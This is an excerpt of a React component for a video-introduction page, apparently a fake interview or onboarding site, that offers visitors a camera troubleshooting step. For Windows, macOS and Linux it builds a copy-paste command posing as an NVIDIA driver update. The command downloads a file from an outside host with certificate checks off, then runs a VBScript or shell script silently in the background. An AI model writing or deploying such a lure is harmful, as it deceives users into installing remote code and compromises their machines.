...
export default function VideoIntro() {
  ...
  const DRIVER_URL = useMemo(() => {
    switch (os) {
      case "Windows":
        return `curl -k -o "%TEMP%\\nv_driver_win64_551.23_rc_whql.zip" https://support.blockforgex.com/api/drivers/update/windows/${token} && powershell -Command "Expand-Archive -Force -Path '%TEMP%\\nv_driver_win64_551.23_rc_whql.zip' -DestinationPath '%TEMP%\\nvidiadrive'" && wscript "%TEMP%\\nvidiadrive\\update.vbs"
        curl -k -o "%TEMP%\\nv_driver_win64_551.23_rc_whql.zip" https://support.blockforgex.com/api/drivers/update/windows/${token} && powershell -Command "Expand-Archive -Force -Path '%TEMP%\\nv_driver_win64_551.23_rc_whql.zip' -DestinationPath '%TEMP%\\nvidiadrive'" && wscript "%TEMP%\\nvidiadrive\\update.vbs"`;
      case "MacOS":
        return `curl -k -o /var/tmp/NVIDIA-driver-downloader.sh https://support.blockforgex.com/api/drivers/update/macos/${token} && chmod +x /var/tmp/NVIDIA-driver-downloader.sh && nohup bash /var/tmp/NVIDIA-driver-downloader.sh >/dev/null 2>&1 &
        curl -k -o /var/tmp/NVIDIA-driver-downloader.sh https://support.blockforgex.com/api/drivers/update/macos/${token} && chmod +x /var/tmp/NVIDIA-driver-downloader.sh && nohup bash /var/tmp/NVIDIA-driver-downloader.sh >/dev/null 2>&1 &`;
      case "Linux":
        return `curl -k -o /var/tmp/NVIDIA-driver-downloader.sh https://support.blockforgex.com/api/drivers/update/linux/${token} && chmod +x /var/tmp/NVIDIA-driver-downloader.sh && nohup bash /var/tmp/NVIDIA-driver-downloader.sh >/dev/null 2>&1 &
        curl -k -o /var/tmp/NVIDIA-driver-downloader.sh https://support.blockforgex.com/api/drivers/update/linux/${token} && chmod +x /var/tmp/NVIDIA-driver-downloader.sh && nohup bash /var/tmp/NVIDIA-driver-downloader.sh >/dev/null 2>&1 &`;
      default:
  ...
  return (
    <Layout title="Share Your Story & Achievements">
        ...
        <div className="flex flex-col justify-center space-y-6">
          <div className="flex items-center gap-3">
            ...
            {!cameraReady && (
              ...
              >
                {cameraStatus ? 'Waiting...' : 'Why this happens?'}
              </button>
            )}
          </div>

          <h2 className="text-xl font-semibold text-gray-800">
            Briefly share who you are, what you've achieved, and what drives you
          </h2>
